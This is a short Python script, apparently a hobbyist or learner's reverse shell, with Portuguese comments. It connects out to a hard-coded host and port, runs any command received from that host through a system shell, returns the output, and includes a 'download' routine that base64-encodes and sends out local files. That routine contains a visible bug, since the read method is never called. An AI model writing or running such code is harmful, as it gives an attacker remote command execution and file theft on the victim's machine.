import socket
import os
import subprocess
import base64

def shell():
    current_dir = os.getcwd()
    print("-----------------------------------------")
    print("Current dir:",current_dir)
    print("Client type:", type(client),"->",id(client))
    client.send(current_dir.encode())
    while True:
        res=client.recv(1024).decode().rstrip()
        print("Resposta:",res)
        if res == "exit":
            print("Exit:",res)
            break
        elif res[:2]=="cd" and len(res) > 2:
            print("Res:", res[3:])
            os.chdir(res[3:])
            result = os.getcwd()
            client.send(result.encode())
        elif res[:8]=="download": #enviar arquivo
            with open(res[9:],'rb') as file_download:
                client.send(base64.b64encode(file_download.read))
        else:
            proc=subprocess.Popen(res,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result=proc.stdout.read()+proc.stderr.read()
            if len(result) == 0:
                client.send("1".encode())
            else:
                client.send(result)

client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect(('10.42.0.1',7777))
shell()
client.close()
